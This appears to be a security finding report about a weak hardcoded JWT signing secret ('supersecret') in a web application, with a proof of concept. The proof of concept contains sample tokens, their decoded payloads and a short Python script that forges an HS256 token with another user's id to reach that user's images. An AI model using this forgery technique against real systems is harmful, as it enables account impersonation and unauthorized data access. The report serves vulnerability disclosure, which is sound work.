# Description


- **Type:** Broken Authentication / JWT Secret Disclosure  
- **Location:** All JWT-protected endpoints  
- **Severity:** 🔴 High  
- **Impact:** Token forgery, role escalation, account impersonation  

The application uses **JSON Web Tokens (JWT)** for authentication and authorization, signed with the `HS256` algorithm.  
During testing, it was discovered that the JWT secret is set to a **weak hardcoded value**: supersecret  

![jwt](../images/jwt.jpg)  

This secret is trivially guessable via brute-force or dictionary attacks using tools like `jwt-cracker`, `jwt_tool`, or `hashcat`.  

By signing arbitrary tokens with the known secret, it is possible to forge valid JWTs and escalate privileges  


## PoC 

For that PoC I created 2 different account with given JWTs:

> eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6MzQyLCJsb2dpbiI6Inlob3JtIiwibWFpbCI6IjEyM0AxMjMuY29tIiwicm9sZSI6InVzZXIiLCJpcCI6IjE0Ni4xNTguNjYuMjA5In0.  2W9Jjpmbh8XS8QmfJRJX5tAb_LoIiiWFRfkprJXj6W4

When decoded:

```
{
  "id": 342,
  "login": "yhorm",
  "mail": "123@123.com",
  "role": "user",
  "ip": "146.158.66.209"
}
```

And second 

> eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6MzYwLCJsb2dpbiI6IlBPT0MiLCJtYWlsIjoiMzFAMzIyLmNvbSIsInJvbGUiOiJ1c2VyIiwiaXAiOiIxNDYuMTU4LjY2LjIwOSJ9.v0FPpLfWFAqPO7iskaHPckFLmqubk3Gep00xx_C1L-0  

```json
{
  "id": 360,
  "login": "POOC",
  "mail": "31@322.com",
  "role": "user",
  "ip": "146.158.66.209"
}
```

With that tokens we will try to access /images.php?id=13921 (POOC user image) which is not accesible to 'yhorm' user.  
[jwt_poc](../images/jwt_poc.jpg)  

After testing it was clear that we can access others image only by changing **id** value.  
```python
import jwt

secret = "supersecret"

payload = {
    "id": 360, #id for POOC user
    "login": "yhorm",
    "role": "user",
    "mail": "123@123.com",
    "ip": "146.158.66.209"
}

token = jwt.encode(payload, secret, algorithm="HS256")
print(token)
```
New jwt token:  
> eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MzYwLCJsb2dpbiI6Inlob3JtIiwicm9sZSI6InVzZXIiLCJtYWlsIjoiMTIzQDEyMy5jb20iLCJpcCI6IjE0Ni4xNTguNjYuMjA5In0.0ej8hhRWs6vqNhRNQ4w-7G2xTSEqixOzFPauTyIxY6c

![jwttt](..images/jwt_final.jpg)

Successfully got access to other account image only by changing id value. 

